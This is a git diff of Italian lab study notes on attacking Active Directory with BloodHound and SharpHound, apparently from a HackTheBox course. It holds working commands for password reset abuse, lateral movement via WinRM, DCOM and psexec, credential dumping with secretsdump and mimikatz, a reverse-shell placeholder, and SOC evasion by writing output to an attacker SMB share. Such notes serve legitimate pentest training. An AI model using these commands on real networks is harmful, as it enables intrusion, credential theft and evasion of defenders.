@@ -1,11 +1,185 @@
 # BloodHound
 BllodHound usa Graph Theory.
-![alt text](images/graphBloodHound1.png)
+![alt text](images/bloodhound/graphBloodHound1.png)
 
 Grace è membro di SQL Admins.
 
 ## Installation
 TODO Prima o poi lo scriverò...
+
+
+
+
+## Attacchi
+
+### ForceChangePassword
+![alt text](images/bloodhound/ForceChangePassword.png)
+
+Grace -> fa parte del gruppo **PasswordReset** -> ha il **"ForceChangePassword"** su Rosy
+
+```
+PS C:\Tools> . .\PowerView.ps1
+PS C:\Tools> $SecPassword = ConvertTo-SecureString 'Password11' -AsPlainText -Force
+PS C:\Tools>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\grace', $SecPassword)
+PS C:\Tools> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\Tools> Set-DomainUserPassword -Identity rosy -AccountPassword $UserPassword -Credential $Cred
+```
+
+E poi ti puoi loggare come `rosy` sulla workstation in cui può loggarsi (questo puoi vederlo su BloodHound, selezionando `rosy` e premendo **"First Degree RDP Privileges"**).
+
+
+### CanRDP, CanPSRemote, ExecuteDCOM
+Li vedi dal sottomenu "Execution Rigths"
+![alt text](images/bloodhound/canRDP_canPSREmote_ExecuteDCOM.png)
+
+#### CanRDP
+Rosy -> CanRDP -> SRV01
+
+- Su BloodHound, selezionando `rosy` e premendo **"First Degree RDP Privileges"**
+
+Accedi con:
+- Remote Desktop Controller
+- `xfreerdp /v:SRV01 /u:rosy /p:Password99 /dynamic-resolution /drive:.,linux`
+
+Ti apre una sessione grafica completa. È il metodo più "rumoroso" perché crea una sessione interattiva ben visibile nei log.
+
+#### CanPSRemote → PowerShell Remoting (WinRM)
+Rosy -> CanPSRemote -> SRV01
+
+- In teoria dovrebbe essere sotto "Execution Rights" (nel lab non c'era). //TODO da confermare!
+
+```
+PS C:\Tools> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\Tools> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\rosy', $SecPassword)
+PS C:\Tools> Enter-PSSession -ComputerName SRV01 -Credential $Cred
+[SRV01]: PS C:\Users\rosy\Documents> $env:username
+rosy
+[SRV01]: PS C:\Users\rosy\Documents> $env:computername
+SRV01
+```
+
+Ti dà una shell PowerShell remota su SRV01. Usa la porta 5985 (WinRM). **Meno rumoroso di RDP perché non crea sessione grafica.**
+
+#### ExecuteDCOM
+Rosy -> ExecuteDCOM" -> SRV01
+
+```
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\rosy', $SecPassword)
+
+$ComputerName = "SRV01.INLANEFREIGHT.HTB"
+$ProgId = "MMC20.Application"
+$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
+$ComObject = [Activator]::CreateInstance($Type)
+
+# Esegui un comando tramite il COM object
+$ComObject.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\output.txt", "7")
+```
+In questo caso scriverà un file sul SRV01 (non proprio utile, dovresti poi entrarci con Enter-PSSession per esempio). Ma si può anche fare:
+
+##### Opzione 1 – Scrivi l'output su uno share di rete (tuo)
+```
+$ComObject.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -e <base64_reverseshell>", "7")
+```
+L'output arriva direttamente sul tuo attacker host.
+
+##### Opzione 2 – Reverse shell
+```
+$ComObject.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -e <base64_reverseshell>", "7")
+```
+Ti apre una shell interattiva verso il tuo attacker host.
+
+> Quindi quando ha senso usare ExecuteDCOM?
+>
+>Tipicamente lo usi per scaricare ed eseguire un payload (reverse shell, beacon C2) sulla macchina remota, non per leggere output. È un punto di ingresso, non uno strumento interattivo.
+
+### AdminTo
+![alt text](images/bloodhound/AdminTo.png)
+- AdminTo significa che Sarah è Local Administrator su SRV01, quindi hai il massimo dei privilegi sulla macchina. 
+- AdminTo è l'edge più potente perché ti dà controllo completo della macchina, inclusa la possibilità di rubare credenziali di altri utenti loggati su quella macchina. 
+- Puoi sfruttarlo in diversi modi.
+
+##### Opzione 1 – PSExec (shell interattiva)
+```
+# Da Linux
+impacket-psexec INLANEFREIGHT.HTB/sarah:Password12@SRV01
+
+# Da Windows
+.\PsExec.exe \\SRV01 -u INLANEFREIGHT\sarah -p Password12 cmd.exe
+```
+
+##### Opzione 2 – WMIExec
+```
+impacket-wmiexec INLANEFREIGHT.HTB/sarah:Password12@SRV01
+```
+
+##### Opzione 3 – PSRemote (se abilitato)
+```
+$SecPassword = ConvertTo-SecureString 'Password12' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\sarah', $SecPassword)
+
+Enter-PSSession -ComputerName SRV01 -Credential $Cred
+```
+
+Essere local admin non implica automaticamente poter usare PSRemote, perché WinRM è un servizio separato che deve essere:
+- Avviato sul target (WinRM service running)
+- Configurato per accettare connessioni remote (Enable-PSRemoting)
+- Non bloccato dal firewall (porta 5985)
+
+###### Può succedere che:
+![alt text](images/bloodhound/esempio_sarah_adminTo.png)
+
+Nel Node Info di Sarah trovi:
+```
+OUTBOUND OBJECT CONTROL  (o LOCAL ADMIN RIGHTS)
+  └── First Degree Local Admin: 1  → SRV01
+```
+Oppure dal lato di SRV01:
+```
+LOCAL ADMINS
+  └── First Degree Local Admins → sarah appare qui
+```
+
+Ma con **AdminTo** puoi comunque abilitare tu stesso WinRM da remoto:
+```
+# Se hai AdminTo puoi abilitare WinRM tramite WMI
+Invoke-WmiMethod -ComputerName SRV01 -Credential $Cred -Class Win32_Process -Name Create -ArgumentList "powershell Enable-PSRemoting -Force"
+```
+> Ma è più rumoroso e macchinoso. Meglio usare direttamente PSExec o secretsdump con AdminTo.
+
+##### Opzione 4 – Dumping credenziali (il vero valore di AdminTo)
+```
+# Da Linux
+impacket-secretsdump INLANEFREIGHT.HTB/sarah:Password12@SRV01
+
+# Da Windows con Mimikatz
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
+## AddMember
+![alt text](images/bloodhound/AddMember.png)
+
+- AddMembers su ITManagers significa che Martha può aggiungere utenti al gruppo ITManagers.
+- Da solo non sembra utile, ma diventa potente quando guardi cosa può fare il gruppo ITManagers nel grafo! Magari ha qualche local admin in qualche altra parte!
+
+Aggiungere nel gruppo:
+```
+$SecPassword = ConvertTo-SecureString 'Password13' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\martha', $SecPassword)
+
+# Aggiunge martha stessa al gruppo ITManagers - Comando POWERVIEW (includilo prima)
+Add-DomainGroupMember -Identity 'ITManagers' -Members 'martha' -Credential $Cred -Verbose
+
+# Verifica che è stato aggiunto nel gruppo
+Get-DomainGroupMember -Identity 'ITManagers' -Credential $Cred
+```
+
+### Differenza con AddSelf
+![alt text](images/bloodhound/AddMemberVSAddSelf.png)
+
+`AddMembers` è più potente perché puoi aggiungere anche altri utenti, non solo te stesso.
+
+
 
 
 # SharpHound - Data Collection da Windows
@@ -45,10 +219,10 @@ Chi è loggato interattivamente in quel momento su quella macchina. Questo perme
 
 >"L'utente Domain Admin è loggato sulla macchina WORKSTATION-42" → potenziale target per credential dumping.
 
-![alt text](images/sharphound_privilege.png)
+![alt text](images/bloodhound/sharphound_privilege.png)
 > Senza privilegi di Local Administrator sulla macchina target, le chiamate API remote (come NetLocalGroupGetMembers e NetSessionEnum) vengono rifiutate o ritornano dati vuoti.
 
-![alt text](images/sharphound_contestoEsecuzione.png)
+![alt text](images/bloodhound/sharphound_contestoEsecuzione.png)
 
 Una volta eseguito, ShapHound crea dei file zip che possono essere messi su BloodHound.
 
@@ -57,24 +231,24 @@ Una volta eseguito, ShapHound crea dei file zip che possono essere messi su Bloo
 
 - **All**: Fa tutto, tranne GPOLocalGroup. Massima raccolta, massimo rumore. Da usare solo in ambienti dove non c'è monitoring o in lab.
 - **DCOnly**: Parla solo con il Domain Controller:
-![alt text](images/DCOnly.png)
+![alt text](images/bloodhound/DCOnly.png)
 Raccoglie: utenti, computer, gruppi, trust, ACL, OU, GPO. Tenta anche di correlare le GPO ai computer che ne sono affetti, per inferire i local group senza connettersi alle macchine.
 - **ComputerOnly**: L'opposto: parla solo con le singole macchine, non interroga l'AD. Raccoglie: sessioni attive + membri dei gruppi locali.
 
 ### Cosa usare?
 Se si considera un ambiente:
-![alt text](images/ambiente_SOC_shaphound.png)
+![alt text](images/bloodhound/ambiente_SOC_shaphound.png)
 
 Alcune strategie per non farsi sgamare:
-![alt text](images/strategie_Sharphound.png)
+![alt text](images/bloodhound/strategie_Sharphound.png)
 
 ### Riassunto Metodi di Collection
-![alt text](images/riassunto_metodi_sharphound.png)
+![alt text](images/bloodhound/riassunto_metodi_sharphound.png)
 
 > Il traffico verso il Domain Controller è fisiologico in un dominio Windows — centinaia di macchine lo contattano continuamente. Il traffico da una singola macchina verso tutte le altre è invece anomalo e facilmente rilevabile.
 
 ## Flag comuni di SharpHound
-![alt text](images/flagSharpHound.png)
+![alt text](images/bloodhound/flagSharpHound.png)
 ### --ldapusername / --ldappassword
 
 Servono quando hai credenziali diverse dall'utente con cui sei loggato.
@@ -160,4 +334,383 @@ SharpHound.exe \
   --ldapport 3890 \
   --collectionmethod DCOnly    # silenzioso, solo traffico verso DC
   ```
+
+## Randomizzare e nascondere l'output di SharpHound
+Il comportamento default di SharpHound è riconoscibile dai difensori:
+![alt text](images/bloodhound/output_sharphound.png)
+
+> Un SOC o un AV può creare regole di detection basate su questi pattern di file.
+
+### Le opzioni di evasione
+![alt text](images/bloodhound/opzioni_evasione_sharphound.png)
+
+### Una possibile tecnica di evasione
+**Non scrivere mai nulla sul disco della macchina vittima.**
+
+#### Step 1 – Prepari uno share SMB sul tuo attacker host
+```
+sudo impacket-smbserver share ./ -smb2support -user test -password test
+```
+Il tuo Kali/PwnBox diventa un file server SMB.
+
+#### Step 2 – Monti lo share dalla macchina vittima
+```
+net use \\10.10.14.33\share /user:test test
+```
+
+#### Step 3 – Esegui SharpHound con tutto offuscato
+```
+SharpHound.exe \
+  --memcache \
+  --outputdirectory \\10.10.14.33\share\ \
+  --zippassword HackTheBox \
+  --outputprefix HTB \
+  --randomfilenames
+```
+
+#### Risultato sul disco della vittima:
+> (niente)  ← nessun file scritto localmente
+
+#### Risultato sul tuo attacker host:
+> HTB_20230111113143_5yssigbd.w3f   ← nome e estensione casuali
+
+
+#### Analisi dell'output randomizzato
+```
+unzip ./HTB_20230111113143_5yssigbd.w3f
+# password: HackTheBox
+
+# Dentro trovi:
+HTB_20230111113143_hjclkslu.2in
+HTB_20230111113143_hk3lxtz3.1ku
+HTB_20230111113143_kghttiwp.jbq
+...
+```
+
+Tutti i file hanno:
+- Prefisso HTB_ + timestamp (da --outputprefix)
+- Nome casuale (da --randomfilenames)
+- Estensione casuale → non sono più .json riconoscibili
+
+BloodHound è comunque in grado di importarli correttamente, riconosce il contenuto indipendentemente dal nome o estensione.
+
+#### Cosa si evade con questa tecnica
+![alt text](images/bloodhound/tecnica_evasion_sharphound.png)
+
+>Lo zip protetto da password va prima decompresso e poi importato in BloodHound. Senza password invece puoi importare il file direttamente, anche con nome e estensione casuali.
+
+
+## Session Loop Collection Method
+### Il problema: le sessioni sono effimere
+**Una sessione esiste solo mentre l'utente è connesso. Appena si disconnette, sparisce in pochi minuti.**
+
+![alt text](images/bloodhound/sessions.png)
+
+Quindi se SharpHound fa una sola raccolta e in quel momento non c'è nessuno connesso:
+```
+net session
+> There are no entries in the list.
+```
+→ BloodHound non avrà nessun dato sulle sessioni, perdendo informazioni preziose su dove sono loggati gli utenti privilegiati.
+
+### Perché le sessioni sono importanti?
+In un attacco AD, sapere **dove è loggato un utente privilegiato** è fondamentale:
+
+![alt text](images/bloodhound/bloodhound_session_priviledge.png)
+
+Senza dati di sessione, questo path di attacco è invisibile nel grafo.
+
+### La soluzione: --loop
+Invece di fare una sola raccolta, SharpHound continua a interrogare i computer a intervalli regolari, catturando le sessioni man mano che appaiono.
+
+![alt text](images/bloodhound/loop_flag_sharphound.png)
+
+#### Esempio
+```
+SharpHound.exe -c Session --loop --loopduration 01:00:00 --loopinterval 00:01:00
+```
+
+- Raccoglie solo sessioni (-c Session)
+- Va in loop per 1 ora (--loopduration 01:00:00)
+- Interroga ogni computer ogni 1 minuto (--loopinterval 00:01:00)
+
+Timeline di esecuzione
+```
+14:15  →  Raccolta iniziale (0 sessioni trovate)
+14:16  →  Aspetta 30 secondi (warm-up fisso)
+14:16  →  Loop 1 inizia
+14:17  →  Loop 2
+14:18  →  Loop 3
+...
+15:16  →  Stop (dopo 1 ora)
+```
+
+### --stealth: ridurre il rumore
+Interrogare tutti i computer ogni minuto per un'ora genera molto traffico. Il flag `--stealth` ottimizza questo:
+
+![alt text](images/bloodhound/stealth_flag_sharphound.png)
+
+Utile in ambienti monitorati dove vuoi comunque raccogliere sessioni ma con meno rumore.
+
+
+### Possibile Combinazione in uno scenario reale
+
+```
+# Prima raccolta silenziosa di tutto il dominio
+SharpHound.exe --collectionmethod DCOnly --memcache --randomfilenames
+
+# Poi loop di sessioni su macchine selezionate, stealth
+SharpHound.exe -c Session \
+  --loop \
+  --loopduration 02:00:00 \
+  --loopinterval 00:05:00 \
+  --stealth \
+  --memcache \
+  --outputdirectory \\10.10.14.33\share\
+```
+
+`--stealth` non richiede un file di computer da noi — è SharpHound stesso che decide autonomamente quali macchine interrogare, scegliendo quelle statisticamente più probabili ad avere sessioni attive (es: file server, print server, macchine con molte connessioni).
+
+Se invece vogliamo noi scegliere le macchine target, dobbiamo usare `--computerfile`:
+```
+SharpHound.exe -c Session \
+  --loop \
+  --loopduration 02:00:00 \
+  --loopinterval 00:05:00 \
+  --computerfile targets.txt \
+  --memcache \
+  --outputdirectory \\10.10.14.33\share\
+```
+
+![alt text](images/bloodhound/stealth_flag_computer_sharphound.png)
+
+> Microsoft ha introdotto il requisito di essere **Local Administrator** per raccogliere dati di sessione. Quindi `--loop` è efficace solo sui computer dove hai già privilegi amministrativi.
+
+## Running SharpHound da sistemi non joinati al dominio
+Normalmente SharpHound gira su una macchina già membro del dominio, quindi eredita automaticamente il contesto di autenticazione AD. Ma in alcuni scenari non hai questo lusso:
+
+- Sei su un attacker host (Kali, PwnBox) con solo accesso di rete
+- Hai compromesso una macchina workgroup (non joinata al dominio)
+- Stai facendo un pentest con accesso di rete ma nessuna macchina nel dominio
+
+### La soluzione: runas /netonly
+
+![alt text](images/bloodhound/riassunto_non_join_sharphound.png)
+
+
+```
+runas /netonly /user:INLANEFREIGHT\htb-student cmd.exe
+```
+
+Cosa fa `/netonly`?
+
+![alt text](images/bloodhound/netonly.png)
+
+Quindi tutto il traffico di rete (LDAP, SMB, ecc.) viene autenticato come htb-student nel dominio, anche se la macchina non è jointa.
+
+> ⚠️ **Attenzione**: `runas /netonly` non valida le credenziali al momento dell'esecuzione. Se sbagli la password, te ne accorgi solo quando provi a fare qualcosa in rete.
+
+#### Il prerequisito: la risoluzione DNS
+Prima di tutto la macchina deve risolvere i **nomi del dominio AD**. Senza questo, SharpHound non riesce a trovare i DC o le macchine del dominio.
+
+##### Opzione 1 – Configurare il DNS (preferita)
+Puntare la scheda di rete al DNS server del dominio (solitamente il DC):
+
+DNS Server: 172.16.130.3  (IP del Domain Controller)
+
+![alt text](images/bloodhound/dns_DC.png)
+
+##### Opzione 2 – File hosts (fallback)
+Aggiungere manualmente i record al file C:\Windows\System32\drivers\etc\hosts:
+```
+172.16.130.3    inlanefreight.htb
+172.16.130.3    dc01.inlanefreight.htb
+```
+
+> Meno affidabile perché risolve solo i nomi che inserisci manualmente, possono esserci errori su nomi non presenti.
+
+##### Il flusso completo passo per passo
+```
+1. Configuri il DNS → punta al DC del dominio target
+
+2. Apri cmd normale e lanci:
+   runas /netonly /user:INLANEFREIGHT\htb-student cmd.exe
+   (inserisci la password)
+
+3. Si apre una NUOVA finestra cmd con contesto di rete del dominio
+
+4. Verifichi che funzioni:
+   net view \\inlanefreight.htb\
+   → deve mostrarti le share (NETLOGON, SYSVOL)
+   → se fallisce: credenziali sbagliate o DNS non configurato
+
+5. Da quella finestra lanci SharpHound:
+   SharpHound.exe -d inlanefreight.htb
+```
+
+###### Perché verificare con net view?
+```
+net view \\inlanefreight.htb\
+
+Shared resources at \\inlanefreight.htb\
+NETLOGON    Disk    Logon server share
+SYSVOL      Disk    Logon server share
+```
+
+Vedere NETLOGON e SYSVOL conferma tre cose:
+- Il DNS risolve correttamente il dominio
+- Le credenziali sono valide
+- Hai accesso di rete al DC
+
+
+#### Per trovare il DC
+
+Prima capisci dove sei
+```
+ipconfig /all
+```
+Cerca:
+- DNS Servers → spesso è direttamente il DC, se è joinata
+- Domain → ti dice il nome del dominio, se è joinata
+
+
+##### Se hai già una shell su una macchina del dominio
+```
+# Metodo più diretto
+echo %LOGONSERVER%
+
+# Oppure
+nltest /dclist:<dominio>
+
+# Oppure
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<dominio>
+```
+
+##### Se sei completamente esterno (solo accesso di rete)
+**Nmap – cerchi porte tipiche dei DC
+**
+```
+# I DC espongono sempre queste porte:
+# 88  → Kerberos
+# 389 → LDAP
+# 445 → SMB
+# 3268 → Global Catalog
+
+nmap -p 88,389,445,3268 192.168.1.0/24
+# Chi ha tutte e quattro aperte è quasi certamente un DC
+```
+
+**Responder / network sniffing**
+
+```
+# Ascolti il traffico broadcast della rete
+# I client AD generano continuamente traffico verso il DC
+sudo responder -I eth0 -A   # modalità passiva, solo ascolto
+```
+**DNS query (se riesci a raggiungere un DNS della rete)**
+
+```
+# I DC registrano record SRV speciali in DNS
+nslookup -type=SRV _ldap._tcp.dc._msdcs.inlanefreight.htb <ip_dns_server>
+```
+
+# BloodHound.py - Data Collection da Linux
+SharpHound è un eseguibile Windows. Quando sei su **Linux** (il tuo Kali/PwnBox) e vuoi raccogliere dati AD, usi **BloodHound.py**, che fa la stessa cosa ma gira nativamente su Linux.
+
+## Installazione
+```
+$ pip install bloodhound
+```
+Quanto è facile!
+
+Si può installare anche dal repository Github
+```
+$ git clone https://github.com/fox-it/BloodHound.py -q
+$ cd BloodHound.py/
+$ sudo python3 setup.py install
+```
+
+## Autenticazione supportata
+BloodHound.py è flessibile sul metodo di autenticazione:
+
+![alt text](images/bloodhound/bloodhound_linux_auth.png)
+
+> Di default tenta Kerberos prima, e se fallisce fa fallback a NTLM automaticamente.
+
+## Il problema del DNS (uguale a prima!)
+Ritorna lo stesso concetto visto con SharpHound su macchine non joinata: **devi risolvere i nomi del dominio.**
+
+BloodHound.py risolve questo con `--nameserver`:
+```
+bloodhound-python -d inlanefreight.htb \
+  -c DCOnly \
+  -u htb-student \
+  -p HTBRocks! \
+  -ns 10.129.204.207    # ← usa questo DNS invece del tuo
+```
+
+Però `--nameserver` ha un limite importante con Kerberos.
+
+
+### Kerberos vs NTLM – la differenza pratica
+Con `--nameserver` (NTLM fallback)
+```
+bloodhound-python ... -ns 10.129.204.207 -k
+
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
+# BloodHound.py usa --nameserver per le query LDAP
+# ma il TUO sistema operativo non sa risolvere inlanefreight.htb
+# → Kerberos fallisce perché non trova il KDC
+# → cade su NTLM (funziona lo stesso, ma è più rumoroso)
+```
+
+
+Con `/etc/hosts` configurato (Kerberos funziona)
+```
+# Prima aggiungi il DC agli hosts
+echo "10.129.204.207 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb" | sudo tee -a /etc/hosts
+
+# Poi lanci con Kerberos
+bloodhound-python ... -ns 10.129.204.207 --kerberos
+# ✅ Il sistema risolve dc01.inlanefreight.htb → trova il KDC → Kerberos funziona
+```
+
+Quindi senza configurazioni DNS, funziona comunque ma cade su NTLM. Solo che è più rumoroso!
+
+Perché NTLM è più rumoroso?
+- È anomalo nel 2024: Le organizzazioni moderne disabilitano o limitano NTLM proprio perché è vecchio e vulnerabile (Pass-the-Hash, relay attacks). Un SOC che vede traffico NTLM da un host insolito si insospettisce.
+- Passa per il DC in modo diverso: NTLM richiede che il server contatti il DC per validare ogni autenticazione (evento 4776 nei log di Windows), generando log facilmente rilevabili.
+- È associato ad attacchi noti: Tool come Responder, ntlmrelayx, e altri abusano NTLM. I blue team hanno spesso alert specifici su traffico NTLM anomalo.
+
+> Kerberos è il metodo di autenticazione nativo di Windows AD. Usarlo fa sembrare il tuo traffico normale, come quello di qualsiasi macchina del dominio. NTLM è più vecchio e alcune organizzazioni lo monitorano o addirittura lo bloccano.
+
+![alt text](images/bloodhound/kerberos_vs_NTLM.png)
+
+
+![alt text](images/bloodhound/riassunto_bloodhound_python_DNS_kerberos.png)
+
+#### Requisito extra per Kerberos: sincronizzazione orario
+
+Kerberos è sensibile alla differenza di orario tra client e KDC (tollera max 5 minuti):
+```
+bashsudo ntpdate 10.129.204.207
+```
+
+Se l'orario è sfasato, il TGT viene rifiutato anche con DNS configurato correttamente.
+
+### Output di BloodHound.py
+A differenza di SharpHound, non crea uno zip automaticamente:
+```
+# Output default → file JSON separati
+20230112171634_computers.json
+20230112171634_containers.json
+20230112171634_domains.json
+20230112171634_gpos.json
+20230112171634_groups.json
+20230112171634_ous.json
+20230112171634_users.json
+
+# Se vuoi lo zip:
+bloodhound-python ... --zip
+```
 
